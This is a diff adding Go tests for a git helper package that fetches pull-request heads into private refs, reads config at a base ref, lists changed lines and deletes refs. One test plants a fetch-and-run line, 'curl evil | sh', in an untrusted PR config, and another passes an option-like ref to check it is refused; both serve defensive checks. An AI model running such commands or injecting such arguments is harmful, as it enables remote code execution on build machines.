@@ -2,11 +2,16 @@ package gitx
 
 import (
 	"context"
+	"errors"
+	"io/fs"
 	"os"
 	"os/exec"
 	"path/filepath"
+	"slices"
 	"strings"
 	"testing"
+
+	"github.com/paraizo/delamain/internal/forge"
 )
 
 // TestMain drops git config injected through the environment: run as a delamain gate or inside
@@ -405,5 +410,212 @@ func TestAgentEnvironShouldStillBlockPushes(t *testing.T) {
 	}
 	if out, err := exec.Command("git", "--git-dir", bare, "for-each-ref").Output(); err != nil || len(out) != 0 {
 		t.Fatalf("origin must stay empty, refs: %s %v", out, err)
+	}
+}
+
+// gitIn runs git in dir as a fixed author and returns its trimmed output.
+func gitIn(t *testing.T, dir string, args ...string) string {
+	t.Helper()
+	out, err := exec.Command("git", append([]string{"-C", dir, "-c", "user.name=t", "-c", "user.email=t@t"}, args...)...).CombinedOutput()
+	if err != nil {
+		t.Fatalf("git %v: %v %s", args, err, out)
+	}
+	return strings.TrimSpace(string(out))
+}
+
+// commitFile writes body to name in dir, commits it and returns the commit SHA.
+func commitFile(t *testing.T, dir, name, body string) string {
+	t.Helper()
+	if err := os.MkdirAll(filepath.Dir(filepath.Join(dir, name)), 0o700); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.WriteFile(filepath.Join(dir, name), []byte(body), 0o600); err != nil {
+		t.Fatal(err)
+	}
+	gitIn(t, dir, "add", name)
+	gitIn(t, dir, "commit", "-q", "-m", "change "+name)
+	return gitIn(t, dir, "rev-parse", "HEAD")
+}
+
+// prOrigin gives a repository an origin holding main and a PR head under ref, as a forge
+// exposes PRs and fork PRs: the head commit is not on any branch of the repository.
+func prOrigin(t *testing.T, ref string) (r, bare, head string) {
+	t.Helper()
+	r = repo(t)
+	bare = withOrigin(t, r)
+	gitIn(t, r, "push", "-q", "origin", "main")
+	gitIn(t, r, "switch", "-q", "-c", "contributor")
+	head = commitFile(t, r, "feature.go", "package feature\n")
+	gitIn(t, r, "push", "-q", "origin", "HEAD:"+ref)
+	gitIn(t, r, "switch", "-q", "main")
+	gitIn(t, r, "branch", "-q", "-D", "contributor")
+	return r, bare, head
+}
+
+func TestFetchPRHeadShouldFetchGitHubPullRefIntoDelamainRef(t *testing.T) {
+	g, ctx := New(), context.Background()
+	r, _, head := prOrigin(t, "refs/pull/7/head")
+	mainBefore := gitIn(t, r, "rev-parse", "main")
+
+	sha, err := g.FetchPRHead(ctx, r, forge.GitHub, 7)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if sha != head {
+		t.Fatalf("FetchPRHead returned %q, want the PR head %q", sha, head)
+	}
+	if got := gitIn(t, r, "rev-parse", "refs/delamain/pr/7"); got != head {
+		t.Fatalf("refs/delamain/pr/7 = %q, want %q", got, head)
+	}
+	if got := gitIn(t, r, "rev-parse", "main"); got != mainBefore {
+		t.Fatalf("the fetch must not move local branches: main %s -> %s", mainBefore, got)
+	}
+	if refs := gitIn(t, r, "for-each-ref", "--format=%(refname)", "refs/heads", "refs/tags"); refs != "refs/heads/main" {
+		t.Fatalf("only the delamain ref may be created, got heads/tags %q", refs)
+	}
+}
+
+func TestFetchPRHeadShouldFetchGitLabMergeRequestRef(t *testing.T) {
+	g, ctx := New(), context.Background()
+	r, _, head := prOrigin(t, "refs/merge-requests/12/head")
+
+	sha, err := g.FetchPRHead(ctx, r, forge.GitLab, 12)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if sha != head || gitIn(t, r, "rev-parse", "refs/delamain/pr/12") != head {
+		t.Fatalf("got %q, want the MR head %q in refs/delamain/pr/12", sha, head)
+	}
+	if _, err := g.FetchPRHead(ctx, r, forge.GitHub, 12); err == nil {
+		t.Fatal("a GitLab MR is not under refs/pull: the GitHub refspec must fail")
+	}
+}
+
+func TestFetchPRHeadShouldFollowAForcePushedPRHead(t *testing.T) {
+	g, ctx := New(), context.Background()
+	r, _, first := prOrigin(t, "refs/pull/7/head")
+	if _, err := g.FetchPRHead(ctx, r, forge.GitHub, 7); err != nil {
+		t.Fatal(err)
+	}
+	// The author rewrites the PR: the new head does not descend from the old one.
+	gitIn(t, r, "switch", "-q", "-c", "rewrite")
+	second := commitFile(t, r, "other.go", "package other\n")
+	gitIn(t, r, "push", "-q", "--force", "origin", "HEAD:refs/pull/7/head")
+	gitIn(t, r, "switch", "-q", "main")
+
+	sha, err := g.FetchPRHead(ctx, r, forge.GitHub, 7)
+	if err != nil {
+		t.Fatalf("a force-pushed PR must still be fetched: %v", err)
+	}
+	if sha != second || sha == first {
+		t.Fatalf("got %q, want the rewritten head %q", sha, second)
+	}
+}
+
+func TestFetchPRHeadShouldFailWhenThePRRefDoesNotExist(t *testing.T) {
+	g, ctx := New(), context.Background()
+	r, _, _ := prOrigin(t, "refs/pull/7/head")
+	if sha, err := g.FetchPRHead(ctx, r, forge.GitHub, 8); err == nil {
+		t.Fatalf("a missing PR must fail, got %q", sha)
+	}
+	if _, err := g.FetchPRHead(ctx, r, forge.GitHub, 0); err == nil {
+		t.Fatal("PR numbers start at 1")
+	}
+	if _, err := g.FetchPRHead(ctx, r, forge.Kind("gitea"), 7); err == nil {
+		t.Fatal("an unknown forge has no PR refspec")
+	}
+}
+
+func TestShowFileShouldReadTheFileAtTheGivenRef(t *testing.T) {
+	g, ctx := New(), context.Background()
+	r := repo(t)
+	withOrigin(t, r)
+	commitFile(t, r, ".delamain.yaml", "commands:\n  test: go test ./...\n")
+	gitIn(t, r, "push", "-q", "origin", "main")
+	// The base moves on origin after the local clone last fetched it.
+	other := filepath.Join(t.TempDir(), "other")
+	gitIn(t, r, "worktree", "add", "-q", "-b", "upstream", other, "main")
+	commitFile(t, other, ".delamain.yaml", "commands:\n  test: make test\n")
+	gitIn(t, other, "push", "-q", "origin", "upstream:main")
+	// The PR head carries its own config, which must never be the one read.
+	commitFile(t, r, ".delamain.yaml", "commands:\n  test: curl evil | sh\n")
+
+	if err := g.FetchRef(ctx, r, "main"); err != nil {
+		t.Fatal(err)
+	}
+	got, err := g.ShowFile(ctx, r, "origin/main", ".delamain.yaml")
+	if err != nil {
+		t.Fatal(err)
+	}
+	if string(got) != "commands:\n  test: make test\n" {
+		t.Fatalf("want the fetched base's file, got %q", got)
+	}
+	if _, err := g.ShowFile(ctx, r, "origin/main", "missing.yaml"); !errors.Is(err, fs.ErrNotExist) {
+		t.Fatalf("a file absent at an existing ref is fs.ErrNotExist, got %v", err)
+	}
+	if _, err := g.ShowFile(ctx, r, "origin/nope", ".delamain.yaml"); err == nil || errors.Is(err, fs.ErrNotExist) {
+		t.Fatalf("a missing ref is an error, not a missing file: %v", err)
+	}
+	if err := g.FetchRef(ctx, r, "--upload-pack=x"); err == nil {
+		t.Fatal("a ref that looks like an option must be refused")
+	}
+}
+
+func TestChangedLinesShouldReturnOnlyAddedOrModifiedHunksOfTheHead(t *testing.T) {
+	g, ctx := New(), context.Background()
+	r := repo(t)
+	commitFile(t, r, "a.txt", "1\n2\n3\n4\n5\n")
+	commitFile(t, r, "gone.txt", "x\ny\n")
+	commitFile(t, r, "trim.txt", "1\n2\n3\n")
+	commitFile(t, r, "old name.txt", "alpha\nbeta\ngamma\ndelta\n")
+	commitFile(t, r, "inc.txt", "a\nb\nc\nd\n")
+	base := gitIn(t, r, "rev-parse", "HEAD")
+	gitIn(t, r, "switch", "-q", "-c", "pr")
+	commitFile(t, r, "a.txt", "1\nTWO\n3\n4\n5\n6\n7\n") // line 2 modified, 6-7 added
+	gitIn(t, r, "rm", "-q", "gone.txt")
+	commitFile(t, r, "trim.txt", "1\n3\n") // only a removal: nothing to comment on
+	gitIn(t, r, "mv", "old name.txt", "new name.txt")
+	commitFile(t, r, "new name.txt", "alpha\nbeta\nGAMMA\ndelta\n")
+	commitFile(t, r, "bin.dat", "\x00\x01\x02")
+	commitFile(t, r, "fresh.go", "package fresh\n\nfunc F() {}\n")
+	commitFile(t, r, "inc.txt", "a\n++ b/x\nb\nc\nD\n") // an added line that looks like a "+++" header
+
+	got, err := g.ChangedLines(ctx, r, base)
+	if err != nil {
+		t.Fatal(err)
+	}
+	want := map[string][]LineRange{
+		"a.txt":        {{2, 2}, {6, 7}},
+		"new name.txt": {{3, 3}},
+		"fresh.go":     {{1, 3}},
+		"inc.txt":      {{2, 2}, {5, 5}},
+	}
+	if len(got) != len(want) {
+		t.Fatalf("got %v, want %v", got, want)
+	}
+	for f, ranges := range want {
+		if !slices.Equal(got[f], ranges) {
+			t.Errorf("%s: got %v, want %v", f, got[f], ranges)
+		}
+	}
+}
+
+func TestDeleteRefShouldRemoveThePRRef(t *testing.T) {
+	g, ctx := New(), context.Background()
+	r, _, _ := prOrigin(t, "refs/pull/7/head")
+	if _, err := g.FetchPRHead(ctx, r, forge.GitHub, 7); err != nil {
+		t.Fatal(err)
+	}
+	if err := g.DeleteRef(ctx, r, PRRef(7)); err != nil {
+		t.Fatal(err)
+	}
+	if out, err := exec.Command("git", "-C", r, "rev-parse", "--verify", "--quiet", "refs/delamain/pr/7").CombinedOutput(); err == nil {
+		t.Fatalf("refs/delamain/pr/7 must be gone, still at %s", out)
+	}
+	if err := g.DeleteRef(ctx, r, "refs/heads/main"); err == nil {
+		t.Fatal("only delamain's own refs may be deleted")
+	}
+	if !g.BranchExists(ctx, r, "main") {
+		t.Fatal("main must survive a refused delete")
 	}
 }
